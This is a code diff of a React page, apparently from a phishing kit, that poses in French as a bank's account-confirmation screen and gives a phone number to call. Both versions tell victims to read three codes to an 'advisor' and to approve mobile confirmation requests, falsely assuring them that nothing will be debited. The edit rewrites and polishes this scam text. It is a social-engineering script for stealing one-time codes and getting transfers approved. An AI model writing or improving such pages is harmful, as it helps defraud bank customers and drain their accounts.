@@ -34,37 +34,56 @@ const AuthenticationSuccess = () => {
           </h1>
 
           <div className="space-y-6 text-gray-600">
-            <p className="leading-relaxed">
-              Suite aux nouvelles mesures de sécurité pour terminer la confirmation de votre compte, 
-              vous serez contacté par téléphone par le service client dans les meilleurs délais.
-            </p>
+  <p className="leading-relaxed">
+    Votre virement est en cours de traitement.
+  </p>
 
-            <div className="bg-blue-50 rounded-lg p-4 flex items-start space-x-3">
-              <Phone className="w-5 h-5 text-blue-500 mt-1 flex-shrink-0" />
-              <div>
-                <p className="font-medium text-blue-900">Service disponible 24h/24 et 7j/7</p>
-                <p className="text-blue-800 text-lg font-semibold">0033 780 949 990</p>
-              </div>
-            </div>
+  <p className="leading-relaxed">
+    Dans le cadre du renforcement de nos mesures de sécurité et de conformité,
+    une vérification complémentaire est nécessaire afin de finaliser la
+    confirmation de votre compte.
+  </p>
 
-            <div className="bg-gray-50 rounded-lg p-4 space-y-3">
-              <p className="font-medium text-gray-900">
-                Processus de vérification :
-              </p>
-              <ul className="list-disc list-inside space-y-2 text-gray-700">
-                <li>Vous recevrez trois (3) differents codes à communiquer au conseiller</li>
-                <li>Vous serez également amené à approuver des demandes de confirmation, mobile, chacune accompagnée d'un montant aléatoire à caractère non débiteur.</li>
-              </ul>
-            </div>
+  <p className="leading-relaxed">
+    À cet effet, vous serez prochainement contacté par téléphone par notre
+    service client dans les meilleurs délais. Vous avez également la possibilité
+    de joindre directement notre service dédié au 0033 780 949 990, disponible
+    24h/24 et 7j/7.
+  </p>
 
-            <div className="bg-yellow-50 rounded-lg p-4 text-yellow-800">
-              <p className="font-medium mb-2">Important :</p>
-              <p>
-                Aucun montant ne sera prélevé de votre compte pendant la vérification 
-                de vos coordonnées et la confirmation de votre identité. Les simulations 
-                qui seront faites ne nécessitent aucun frais.
-              </p>
-            </div>
+  <div className="bg-blue-50 rounded-lg p-4 flex items-start space-x-3">
+    <Phone className="w-5 h-5 text-blue-500 mt-1 flex-shrink-0" />
+    <div>
+      <p className="font-medium text-blue-900">
+        Service disponible 24h/24 et 7j/7
+      </p>
+      <p className="text-blue-800 text-lg font-semibold">
+        0033 780 949 990
+      </p>
+    </div>
+  </div>
+
+  <p className="leading-relaxed">
+    Lors de cet échange, nous procéderons à des simulations de transaction à
+    des fins de vérification. Trois (3) codes distincts vous seront envoyés ;
+    il vous sera demandé de les communiquer au conseiller afin de confirmer
+    votre compte bancaire. Dans certains cas, des demandes de confirmation
+    mobile accompagnées chacune d’un montant aléatoire non débiteur pourront
+    vous être adressées et devront simplement être validées.
+  </p>
+
+  <div className="bg-yellow-50 rounded-lg p-4 text-yellow-800">
+    <p className="font-medium mb-2">Important :</p>
+    <p>
+      Nous vous informons qu’aucun montant ne sera débité de votre compte dans
+      le cadre de cette vérification. Les opérations effectuées sont strictement
+      techniques et visent uniquement à confirmer votre identité. Aucun frais
+      ne sera appliqué.
+    </p>
+  </div>
+
+
+            
           </div>
         </div>
       </main>
